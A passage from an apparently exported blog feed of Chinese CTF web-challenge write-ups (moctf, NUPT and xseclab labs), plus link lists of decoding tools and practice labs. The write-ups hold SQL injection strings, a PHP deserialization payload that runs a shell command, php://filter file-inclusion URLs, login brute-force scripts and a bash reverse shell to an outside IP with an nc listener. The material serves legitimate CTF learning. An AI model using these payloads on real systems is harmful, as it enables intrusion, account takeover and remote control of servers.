$allowedExts)) &#123; $filename = date('Ymdhis').rand(1000, 9999).'.'.$extension; if(move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $filename))&#123; $url="upload/".$filename; $content = file_get_contents($url); $content = preg_replace('/&lt;\?php|\?&gt;/i', '_', $content); file_put_contents('upload/'.$filename, $content); echo "file upload successful!Save in: " . "upload/" . $filename; &#125;else&#123; echo "upload failed!"; &#125; &#125; else &#123; echo "upload failed! allow only jpg,png,gif,jpep"; &#125;&#125;?&gt; flag.php一个假的登入框，根据提示输入?hint=1，发现源码&lt;?php error_reporting(0); include_once("flag.php"); $cookie = $_COOKIE['ISecer']; if(isset($_GET['hint']))&#123; show_source(__FILE__); &#125; elseif (unserialize($cookie) === "$KEY") &#123; echo "$flag"; &#125; else &#123; ?&gt; &lt;?php &#125; $KEY='ISecer:www.isecer.com'; ?&gt;1 Cookie的反序列化 sql2.DS_Store文件泄露 孙XX的博客报错注入12中报错语句sql注入的详细总结空格被过滤可以使用”%09 %0A %0C %0D %0B”替代过滤了很多，尝试用反引号报错,只能读取30个，字符，改变substr()中的后两个值，多次，拼接成完整的字符Flaghttp://103.238.227.13:10088/index.php?id=1%0aand%0aextractvalue(1,concat(0x7e,(select%0aconcat(0x7e,substr((load_file(0x2F7661722F746573742F6B65795F312E706870)),86,146),0x7e)),0x7e)) Trim的日记本login2一个大佬的思路union select md5()的姿势，尝试下username=a' union select 1,md5(1)-- -&amp;password=1 登入成功。出现进程监控系统 过滤了一些东西，导致不能回显，考虑端口反弹在外网主机上监听nc -l -p 8080 -vvv 在网站上输入|bash -i &gt;&amp; /dev/tcp/23.106.128.52/8080 0&gt;&amp;1 之后就可以查看文件，得到flag的文件内容了 login3login4]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文章和笔记资料]]></title>
    <url>%2Fposts%2Fa8ea2937.html</url>
    <content type="text"><![CDATA[把一些别人的笔记和文章，整理一下，方便以后查找。Web-Security-Learning文章整理有趣的二进制读书笔记思维脑图详细的web知识笔记Android 安全内网渗透整理和工具的使用中国ip地址列表]]></content>
      <categories>
        <category>knowledge</category>
        <category>note</category>
      </categories>
      <tags>
        <tag>note</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Online decryption]]></title>
    <url>%2Fposts%2F797044d1.html</url>
    <content type="text"><![CDATA[一些在线的密码解密，整理一下，省得自己以后重复的去找，方便自己。 在线工具导航xssee在线加密解密在线编码解码Unicode转中文Quoted-PrintableROT5/13/18/47编码转换base16base32base64 转图片在线解码编码base64编码和图片编码quipqiup古典密码自动化爆破(词频分析)摩斯密码翻译器摩尔斯电码转换器字符串编码，解码，转换(长度,大小写,反转,进制转换)Cisco Type 7 ReverserCiscojs代码在线加密解密JScript/VBscript脚本解密VBScript.Encode解密JScript.Encode脚本加密与解密uuencode解码 &amp;&amp; xxencode解码(古老的邮件密码)MIME标准(邮件编码的一种)Binhex编码(邮件编码的一种,常见于MAC机)%u8001%u9525非/u的hex，%u编码，只能编码汉字(xssee)猪圈密码ppencode(把Perl代码转换成只有英文字母的字符串)aaencode(JS代码转换成常用的网络表情，也就是我们说的颜文字js加密jotherVigenère维多利亚解密Vigenère cipherHill cipher(希尔密码)Atbash cipher(埃特巴什码)snow(html隐写)十六进制Hex转文本字符串Hex2text 文件在线Hash分解素数(ESA)Punch Cardatool(杂乱)bejson(杂乱)在线分解GIF帧图在线二维码解密生成二维码二维码/条形码在线繁体字转换器在线工具集合文本加密为汉字(“盲文”，音符，各种语言，花朵，箭头…)集合（各种古典密码)集合]]></content>
      <categories>
        <category>knowledge</category>
        <category>crypt</category>
      </categories>
      <tags>
        <tag>crypt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一些靶场]]></title>
    <url>%2Fposts%2F2c81768d.html</url>
    <content type="text"><![CDATA[一些靶场收集 一个真棒平台，包括CTF /安全响应中心/错误跟踪等源码搭建。漏洞靶场平台源码Bwappwebbug靶场xvwa靶场 链接: https://pan.baidu.com/s/1cUdURs 密码: qbkuzvuldrill靶场包含多个漏洞演示程序的虚拟机镜像vulhub]]></content>
      <categories>
        <category>knowledge</category>
        <category>vulnerability</category>
      </categories>
      <tags>
        <tag>vulnerability</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[moctf平台的web题]]></title>
    <url>%2Fposts%2F593de28d.html</url>
    <content type="text"><![CDATA[moctf平台 学长们搭建的平台，挺不错的。 限制访问提示值允许只允许使用NAIVE浏览器访问！通过bp抓包，修改UA为NAIVE。又显示只能允许香港记者访问，修改AL为zh-HK. 机器蛇访问robots.txt 访问不允许访问的页面，即可得到flag。 PHP黑魔法源码泄漏php~进入index.php~,得到源码&lt;?php $flag="moctf&#123;**************&#125;"; if (isset($_GET['a'])&amp;&amp;isset($_GET['b'])) &#123; $a=$_GET['a']; $b=$_GET['b']; if($a==$b) &#123; echo "&lt;center&gt;Wrong Answer!&lt;/center&gt;"; &#125; else &#123; if(md5($a)==md5($b)) &#123; echo "&lt;center&gt;".$flag."&lt;/center&gt;"; echo "By:daoyuan"; &#125; else echo "&lt;center&gt;Wrong Answer!&lt;/center&gt;"; &#125; &#125; else echo "&lt;center&gt;好像少了点什么&lt;/center&gt;"; ?&gt; 因为0e[0-9]+格式的字符串在进行弱类型比较时会按照科学计数法后比较md5(!1793422703!,32) = 0e332932043729729062996282883873md5(QNKCDZO,32) = 0e830400451993494058024219903391md5(240610708,32) = 0e462097431906509019562988736854 我想要钱&lt;?php include "flag.php"; highlight_file(__FILE__); if (isset($_GET['money'])) &#123; $money=$_GET['money']; if(strlen($money)&lt;=4&amp;&amp;$money&gt;time()&amp;&amp;!is_array($money)) &#123; echo $flag; echo "&lt;!--By:daoyuan--&gt;"; &#125; else echo "Wrong Answer!"; &#125; else echo "Wrong Answer!";?&gt; 用科学计数法 money=3e10绕过 听说要登入万能密码绕过 flag在哪里访问flag.php发生多次跳转flag.php -&gt; where_is_flag.php -&gt; I_have_a_flag.php -&gt; I_have_a_frog.php -&gt; no_flag.php 根据提示搜索ppap歌词，PPAPI have a pen,I have an apple.(Eh~)Apple-pen! 根据歌词，猜测flag的文件为，flagfrog.php 死亡退出&lt;?php show_source(__FILE__); $c="&lt;?php exit;?&gt;"; @$c.=$_POST['c']; @$filename=$_POST['file']; if(!isset($filename)) &#123; file_put_contents('tmp.php', ''); &#125; @file_put_contents($filename, $c); include('tmp.php');?&gt; 这道题不懂，附上其他大佬的见解吧 文件包含访问如下链接即可得到flaghttp://119.23.73.3:5001/web8/index.php?file=php://filter/read=convert.base64-encode/resource=flag.php 美味的饼干cookie中ZWUxMWNiYjE5MDUyZTQwYjA3YWFjMGNhMDYwYzIzZWU= 解码得ee11cbb19052e40b07aac0ca060c23ee 注意到是32wei,md5解密的user提示要用admin登入，对admin进行MD5机密，再base64，修改cookie可得 火眼金晶import requestsimport reurl = "http://119.23.73.3:5001/web10/index.php"r = requests.get(url=url)res_tr = r"'100'&gt;(.*?)&lt;/textarea&gt;"txt = re.findall(res_tr,r.content.decode('utf-8'))[0]moctf = r"moctf"mount = re.findall(moctf,txt)number = len(mount)data = &#123; "answer":number&#125;url1 = "http://119.23.73.3:5001/web10/work.php"s = requests.post(url=url1,data=data,cookies=r.cookies)print(s.content) 简单注入不会做import requestsimport stringimport codecss=string.printableflag = ""for i in range(1,30): for j in s: # url = "http://119.23.73.3:5004/?id=3'^'(ascii(mid((select(group_concat(TABLE_NAME))from(information_schema.TABLES)where(TABLE_SCHEMA=database())),"+str(i)+",1))="+j+")" # url = "http://119.23.73.3:5004/?id=3'^'(ascii(mid((select(group_concat(COLUMN_NAME))from(information_schema.COLUMNS)where(TABLE_NAME='do_y0u_l1ke_long_t4ble_name')),"+str(i)+",1))="+j+")" url = "http://119.23.73.3:5004/?id=3'^'(ascii(mid((select(d0_you_als0_l1ke_very_long_column_name)from(do_y0u_l1ke_long_t4ble_name)),"+str(i)+",1))="+j+")" r=requests.get(url) if "Tip" in r.content.decode('utf-8'): flag += j print(flag) break 没时间解释这是一个条件竞争题。访问，index.php跳转到index2.php 。bp抓包，访问index.php,知道要访问uploadsomething.php. 是一个类似上传的页面，随便上传一个，得知flag在哪个位置，访问之，显示too low. 多次尝试，知道flag在固定的目录下，文件名是我们控制的。开两个intruder.http://119.23.73.3:5006/web2/uploadsomething.php?filename=123&amp;content=§1234§ http://119.23.73.3:5006/web2/uploads/7dab88dbd2950685ac8841eb87e6d68f4ef8c1dd/123 unset题目&lt;?phphighlight_file('index.php');function waf($a)&#123;foreach($a as $key =&gt; $value)&#123; if(preg_match('/flag/i',$key))&#123; exit('are you a hacker');&#125;&#125;&#125;foreach(array('_POST', '_GET', '_COOKIE') as $__R) &#123; if($$__R) &#123; foreach($$__R as $__k =&gt; $__v) &#123; if(isset($$__k) &amp;&amp; $$__k == $__v) unset($$__k); &#125; &#125;&#125;if($_POST) &#123; waf($_POST);&#125;if($_GET) &#123; waf($_GET); &#125;if($_COOKIE) &#123; waf($_COOKIE);&#125;if($_POST) extract($_POST, EXTR_SKIP);if($_GET) extract($_GET, EXTR_SKIP);if(isset($_GET['flag']))&#123;if($_GET['flag'] === $_GET['daiker'])&#123; exit('error');&#125;if(md5($_GET['flag'] ) == md5($_GET['daiker']))&#123; include($_GET['file']);&#125;&#125;?&gt; 解法：POST /?flag=QNKCDZO&amp;daiker=s878926199a&amp;file=php://filter/read=convert.base64-encode/resource=flag.php HTTP/1.1Host: 119.23.73.3:5101User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 112X-Forwarded-For: 127.0.0.1, 127.0.0.1Connection: closeUpgrade-Insecure-Requests: 1_GET[flag]=QNKCDZO&amp;_GET[daiker]=s878926199a&amp;_GET[file]=php://filter/read=convert.base64-encode/resource=flag.php PUBG用工具扫一扫发现源码备份index.php.bak&lt;?php error_reporting(0); include 'class.php'; if(is_array($_GET)&amp;&amp;count($_GET)&gt;0) &#123; if(isset($_GET["LandIn"])) &#123; $pos=$_GET["LandIn"]; &#125; if($pos==="airport") &#123; die("&lt;center&gt;机场大仙太多,你被打死了~&lt;/center&gt;"); &#125; elseif($pos==="school") &#123; echo('&lt;/br&gt;&lt;center&gt;&lt;a href="/index.html" style="color:white"&gt;叫我校霸~~&lt;/a&gt;&lt;/center&gt;'); $pubg=$_GET['pubg']; $p = unserialize($pubg); // $p-&gt;Get_air_drops($p-&gt;weapon,$p-&gt;bag); &#125; elseif($pos==="AFK") &#123; die("&lt;center&gt;由于你长时间没动,掉到海里淹死了~&lt;/center"); &#125; else &#123; die("&lt;center&gt;You Lose&lt;/center&gt;"); &#125; &#125;?&gt; class.php.bak&lt;?php include 'waf.php'; class sheldon&#123; public $bag="nothing"; public $weapon="M24"; // public function __toString()&#123; // $this-&gt;str="You got the airdrop"; // return $this-&gt;str; // &#125; public function __wakeup() &#123; $this-&gt;bag="nothing"; $this-&gt;weapon="kar98K"; &#125; public function Get_air_drops($b) &#123; $this-&gt;$b(); &#125; public function __call($method,$parameters) &#123; $file = explode(".",$method); echo $file[0]; if(file_exists(".//class$file[0].php")) &#123; system("php .//class//$method.php"); &#125; else &#123; system("php .//class//win.php"); &#125; die(); &#125; public function nothing() &#123; die("&lt;center&gt;You lose&lt;/center&gt;"); &#125; public function __destruct() &#123; waf($this-&gt;bag); if($this-&gt;weapon==='AWM') &#123; $this-&gt;Get_air_drops($this-&gt;bag); &#125; else &#123; die('&lt;center&gt;The Air Drop is empty,you lose~&lt;/center&gt;'); &#125; &#125; &#125;?&gt; php的魔术方法由Typecho 深入理解PHP反序列化漏洞__wakeup()函数失效引发漏洞(CVE-2016-7124)pyaload?LandIn=school&amp;pubg=O:7:"sheldon":3:&#123;s:3:"bag";s:24:"win.php;cat%20./class/flag";s:6:"weapon";s:3:"AWM";&#125; 查看源代码即可得。 简单的代码审计&lt;?phperror_reporting(0);include('config.php');header("Content-type:text/html;charset=utf-8");function get_rand_code($l = 6) &#123; $result = ''; while($l--) &#123; $result .= chr(rand(ord('a'), ord('z'))); &#125; return $result;&#125;function test_rand_code() &#123; $ip=$_SERVER['REMOTE_ADDR']; $code=get_rand_code(); $socket = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP); @socket_connect($socket, $ip, 8888); @socket_write($socket, $code.PHP_EOL); @socket_close($socket); die('test ok!');&#125;function upload($filename, $content,$savepath) &#123; $AllowedExt = array('bmp','gif','jpeg','jpg','png'); if(!is_array($filename)) &#123; $filename = explode('.', $filename); &#125; if(!in_array(strtolower($filename[count($filename)-1]),$AllowedExt))&#123; die('error ext!'); &#125; $code=get_rand_code(); $finalname=$filename[0].'moctf'.$code.".".end($filename); waf2($finalname); file_put_contents("$savepath".$finalname, $content); usleep(3000000); file_put_contents("$savepath".$finalname, "moctf"); unlink("$savepath".$finalname); die('upload over!');&#125;$savepath="uploads/".sha1($_SERVER['REMOTE_ADDR'])."/";if(!is_dir($savepath))&#123; $oldmask = umask(0); mkdir($savepath, 0777); umask($oldmask);&#125;if(isset($_GET['action']))&#123; $act=$_GET['action']; if($act==='upload') &#123; $filename=$_POST['filename']; if(!is_array($filename)) &#123; $filename = explode('.', $filename); &#125; $content=$_POST['content']; waf($content); upload($filename,$content,$savepath); &#125; else if($act==='test') &#123; test_rand_code(); &#125;&#125;else &#123; highlight_file('index.php');&#125;?&gt; 官方的答案]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[南京邮电大学ctf的web题]]></title>
    <url>%2Fposts%2Fdc43a318.html</url>
    <content type="text"><![CDATA[以前做过了，再做一下，大部分都是挺简单的。 md5 collisionmd5(!1793422703!,32) = 0e332932043729729062996282883873md5(QNKCDZO,32) = 0e830400451993494058024219903391md5(240610708,32) = 0e462097431906509019562988736854 上面三个加密后的MD5值是相等的，构造？a=240610708 层层递进进入跳转的链接，fn+f12打开控制台，在网络项发现一个404页面，进入后，查看源码，仔细观察下面的js链接，flag.&lt;!-- &lt;script src="./js/jquery-n.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-c.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-t.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-f.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-&#123;.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-t.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-h.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-i.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-s.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-_.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-i.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-s.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-_.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-a.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-_.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-f.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-l.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-4.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-g.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-&#125;.7.2.min.js"&gt;&lt;/script&gt;--&gt; AAencode一开始，一直在控制台上运行，一直未成功，仔细看一下，显示 ωﾟﾉ 为定义，定义：var ωﾟﾉ = “ “ 加上编码。 你从哪里来按理说修改，Referer:http://www.google.com 就行，可是一直不成功，作罢。 Download~!两首歌，的下载地址都是download.php?url=歌名.mp3的base64。 猜测flag也是在要这样下载才能出来。不知道flag的文件名是什么。猜了很久没有成功。看别人的答案：才知道，首先下载文件名为download.php得到源码，发现有keyishere.php的文件，用两首歌下载链接的规律base64加密文件名，构造链接访问，即可得到flag。 sql injection 3看链接地址，就猜测到时宽字节注入。这道题有两个flag，在ctf2表中的flag是错误的，ctf4表中的flag才是正确的。得到字段数一开始注释符号，直接用#，失败，页面一直报错，后来用%23，才行id = %df' union select 1,database() %23``` 猜解表名```bashid=%df' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23 猜解字段名id=%df' union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746632 %23 得到记录值id=%df' union select 1,group_concat(id,0x3a,flag) from ctf4 %23 /x00view-source: if (isset ($_GET['nctf'])) &#123; if (@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE) echo '必须输入数字才行'; else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE) die('Flag: '.$flag); else echo '骚年，继续努力吧啊~'; &#125; 构造?nctf[] 解法原理 bypass againif (isset($_GET['a']) and isset($_GET['b'])) &#123;if ($_GET['a'] != $_GET['b'])if (md5($_GET['a']) == md5($_GET['b']))die('Flag: '.$flag);elseprint 'Wrong.';&#125; 构造payload?a[]=1&amp;b[]=2 或者?a=QNKCDZO&amp;b=240610708 变量覆盖&lt;?phpinclude("secret.php");?&gt;&lt;?php if ($_SERVER["REQUEST_METHOD"] == "POST") &#123; ?&gt; &lt;?php extract($_POST); if ($pass == $thepassword_123) &#123; ?&gt; &lt;div class="alert alert-success"&gt; &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt; &lt;/div&gt; &lt;?php &#125; ?&gt; &lt;?php &#125; ?&gt; 直接构造pass=1&amp;thepassword_123=1 #php是世界上最好的语言 &lt;?phpif(eregi("hackerDJ",$_GET[id])) &#123; echo("&lt;p&gt;not allowed!&lt;/p&gt;"); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == "hackerDJ")&#123; echo "&lt;p&gt;Access granted!&lt;/p&gt;"; echo "&lt;p&gt;flag: *****************&#125; &lt;/p&gt;";&#125;?&gt; url编码，传输过去默认会解码一次，所以我们不能只加密一次,将hackerDJ进行url加密两次，构造id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41 ereg和eregi 上传绕过上传的位置为dir+文件名，在dir写xx.php%00(%00进行urldecode),文件名那里为.jpg符合的后缀名。即可绕过 sql注入1&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql="select user from ctf where (user='".$user."') and (pw='".$pass."')"; echo '&lt;/br&gt;'.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]=="admin") &#123; echo "&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;"; &#125; if($query[user] != "admin") &#123; echo("&lt;p&gt;You are not admin!&lt;/p&gt;"); &#125;&#125;echo $query[user];?&gt; 由源码一直用户名填写 admin’)# 密码随便填，即可绕过 pass check&lt;?php$pass=@$_POST['pass'];$pass1=***********;//被隐藏起来的密码if(isset($pass))&#123;if(@!strcmp($pass,$pass1))&#123;echo "flag:nctf&#123;*&#125;";&#125;else&#123;echo "the pass is wrong!";&#125;&#125;else&#123;echo "please input pass!";&#125;?&gt; 构造post请求 pass[] 起个名字真难&lt;?php function noother_says_correct($number)&#123; $one = ord('1'); $nine = ord('9'); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == '54975581388';&#125;$flag='*******';if(noother_says_correct($_GET['key'])) echo $flag;else echo 'access denied';?&gt; 因为key的值不能出现字母，但是又必须等于54975581388所以只能转换成其他进制，发现十六进制的，刚好都是字母0xccccccccc。所以构造key=0xccccccccc 重置密码进入链接后重置的是ctfuser的密码，发现url链接中user1=ctfuser的base64加密，直接点击重置试一下，显示错误。通过pb拦截数据包，将用户名改为admin,相关链接中的user1的值改为admin的base64加密的值。 php反序列化&lt;?phpclass just4fun &#123; var $enter; var $secret;&#125;if (isset($_GET['pass'])) &#123; $pass = $_GET['pass']; if(get_magic_quotes_gpc())&#123; $pass=stripslashes($pass); &#125; $o = unserialize($pass); if ($o) &#123; $o-&gt;secret = "*"; if ($o-&gt;secret === $o-&gt;enter) echo "Congratulation! Here is my secret: ".$o-&gt;secret; else echo "Oh no... You can't fool me"; &#125; else echo "are you trolling?";&#125;?&gt; 序列化小科普首先运行下面代码&lt;?php class just4fun &#123; var $enter; var $secret; function just4fun() &#123; $this-&gt;enter=&amp;$this-&gt;secret; &#125; &#125; echo serialize(new just4fun()); ?&gt; 得到 O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;}构造？pass=O:8:&quot;just4fun&quot;:2:&#123;s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;&#125; sql injection 4#GOAL: login as admin,then get the flag;error_reporting(0);require 'db.inc.php';function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES);&#125;$username = @clean((string)$_GET['username']);$password = @clean((string)$_GET['password']);$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';$result=mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1)&#123; die('Invalid password!');&#125;echo $flag; 构造 ？username=\&amp;password=or 1=1%23后台的查询语句为：SELECT * FROM users WHERE name='\' AND pass=' or 1= 1#'; 综合题通过解密，知道有1bc29b36f623ba82aaf6724fd3b16718.php文件，访问，有提示说tip在我的脑袋，查看返回的头部请求，注意到tip:history of bash,百度可知其用法，访问http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history 得到flag的下载路径。 sql注入2&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query("select pw from ctf where user='$user'")); if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; echo "&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;"; &#125; else &#123; echo("&lt;p&gt;Log in failure!&lt;/p&gt;"); &#125;&#125;?&gt; 解法主要就是通过union 联合查询，将从数据库返回的值为空，自己构造数据库返回的值。 md5(2,32) = c81e728d9d4c2f636f067f89cc14862c 用户名输入&apos; and 1=0 UNION SELECT &quot;c81e728d9d4c2f636f067f89cc14862c&quot; # 密码中输入2 综合题2访问http://cms.nuptzj.cn/about.php?file=say.php&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&amp;lt;meta http-equiv=&amp;quot;Content-Type&amp;quot; content=&amp;quot;text/html; charset=utf-8&amp;quot; /&amp;gt;&amp;lt;?phpinclude &apos;config.php&apos;;$nice=$_POST[&apos;nice&apos;];$say=$_POST[&apos;usersay&apos;];if(!isset($_COOKIE[&apos;username&apos;]))&#123;setcookie(&apos;username&apos;,$nice);setcookie(&apos;userpass&apos;,&apos;&apos;);&#125;$username=$_COOKIE[&apos;username&apos;];$userpass=$_COOKIE[&apos;userpass&apos;];if($nice==&amp;quot;&amp;quot; || $say==&amp;quot;&amp;quot;)&#123;echo &amp;quot;&amp;lt;script&amp;gt;alert(&apos;昵称或留言内容不能为空！(如果有内容也弹出此框，不是网站问题喔~ 好吧，给个提示：查看页面源码有惊喜！)&apos;);&amp;lt;/script&amp;gt;&amp;quot;;exit();&#125;$con = mysql_connect($db_address,$db_user,$db_pass) or die(&amp;quot;不能连接到数据库！！&amp;quot;.mysql_error());mysql_select_db($db_name,$con);$nice=mysql_real_escape_string($nice);$username=mysql_real_escape_string($username);$userpass=mysql_real_escape_string($userpass);$result=mysql_query(&amp;quot;SELECT username FROM admin where username=&apos;$nice&apos;&amp;quot;,$con);$login=mysql_query(&amp;quot;SELECT * FROM admin where username=&apos;$username&apos; AND userpass=&apos;$userpass&apos;&amp;quot;,$con);if(mysql_num_rows($result)&amp;gt;0 &amp;amp;&amp;amp; mysql_num_rows($login)&amp;lt;=0)&#123;echo &amp;quot;&amp;lt;script&amp;gt;alert(&apos;昵称已被使用，请更换！&apos;);&amp;lt;/script&amp;gt;&amp;quot;;mysql_free_result($login);mysql_free_result($result);mysql_close($con);exit();&#125;mysql_free_result($login);mysql_free_result($result);$say=mysql_real_escape_string($say);mysql_query(&amp;quot;insert into message (nice,say,display) values(&apos;$nice&apos;,&apos;$say&apos;,0)&amp;quot;,$con);mysql_close($con);echo &apos;&amp;lt;script&amp;gt;alert(&amp;quot;构建和谐社会，留言需要经过管理员审核才可以显示！&amp;quot;);window.location = &amp;quot;./index.php&amp;quot;&amp;lt;/script&amp;gt;&apos;;?&amp;gt;gt;]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络信息安全攻防]]></title>
    <url>%2Fposts%2F53139f85.html</url>
    <content type="text"><![CDATA[以前做的时候，挺多不会做的，这次卷土重来，重新刷一下！ 脚本关快速口算import requestsimport reurl="http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php"session=requests.session()regular=r'[0-9+*()]+[)]'header=&#123;'Cookie':'PHPSESSID=98f76f8684f350fd7c311decb810cdf8'&#125;res=session.get(url,headers=header)print(res.content)chen=re.compile(regular)obj=chen.findall(res.content.decode('utf-8'))print(obj)html=eval(obj[0])data=&#123;'v':html&#125;r=session.post(url,data=data,headers=header)print(r.content) 逗比验证码第一期该验证码登入一次后，没有失效，再次登入用此验证码，还能生效。 import requestsimport res=requests.session()url="http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php"for pwd in range(1000, 10000): payload = &#123;'username': 'admin', 'pwd': pwd, 'vcode': '83HE'&#125; header=&#123;'Cookie':'PHPSESSID=98f76f8684f350fd7c311decb810cdf8'&#125; r=s.post(url,data=payload,headers=header) print(r.content) if 'error' not in r.content.decode('utf-8'): print("正确的密码为:") print(pwd) print(r.content) break else: print("正在尝试爆破") print(pwd) 逗比验证码第二期import requests, reimport threadingurl = 'http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/index.php'login = 'http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/login.php's = requests.session()c = s.get(url).content.decode('utf-8')print(c)lock = threading.Lock()curTask = 1000maxTask = 10000flag = Falseright = ''header = &#123;'Referer': 'http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/index.php', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1'&#125;def thread(): global lock global curTask global maxTask global flag global right global header while not flag: # 当flag为假也就是正确密码还没出来时，不断取任务来完成 lock.acquire() # 取任务 #这个过程不能被打断 myTask = curTask curTask = curTask + 1 lock.release() if myTask &gt;= maxTask: # 所有任务已经完成就退出 break data = &#123;'username': 'admin', 'pwd': str(myTask), 'vcode': '', 'submit': 'submit'&#125; c1 = s.post(login, data=data, headers=header).content.decode('utf-8') print(str(myTask) + ':' + c1) if 'error' not in c1: right = str(myTask) + ', ' + c1 flag = True # 当密码正确时，flag为真# 多线程执行threadNum = 50threadlist = []for i in range(threadNum): threadlist.append(threading.Thread(target=thread))for i in threadlist: i.start()for i in threadlist: i.join()# 最终输出正确结果print('pwd is ' + right) 逗比的验证码第三期（SESSION）解法同上面 微笑一下就能过关了查看源代码可得&lt;?php header("Content-type: text/html; charset=utf-8"); if (isset($_GET['view-source'])) &#123; show_source(__FILE__); exit(); &#125; include('flag.php'); $smile = 1; if (!isset ($_GET['^_^'])) $smile = 0; if (preg_match ('/\./', $_GET['^_^'])) $smile = 0; if (preg_match ('/%/', $_GET['^_^'])) $smile = 0; if (preg_match ('/[0-9]/', $_GET['^_^'])) $smile = 0; if (preg_match ('/http/', $_GET['^_^']) ) $smile = 0; if (preg_match ('/https/', $_GET['^_^']) ) $smile = 0; if (preg_match ('/ftp/', $_GET['^_^'])) $smile = 0; if (preg_match ('/telnet/', $_GET['^_^'])) $smile = 0; if (preg_match ('/_/', $_SERVER['QUERY_STRING'])) $smile = 0; if ($smile) &#123; if (@file_exists ($_GET['^_^'])) $smile = 0; &#125; if ($smile) &#123; $smile = @file_get_contents ($_GET['^_^']); if ($smile === "(●'◡'●)") die($flag); &#125; ?&gt; &lt;!doctype html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"&gt; &lt;title&gt;Show me your smile :)&lt;/title&gt; &lt;link rel="stylesheet" href="style.css"&gt; &lt;/head&gt; &lt;body&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;div class="loginform cf"&gt; &lt;form name="login" action="index.php" method="POST" accept-charset="utf-8"&gt; &lt;ul&gt; 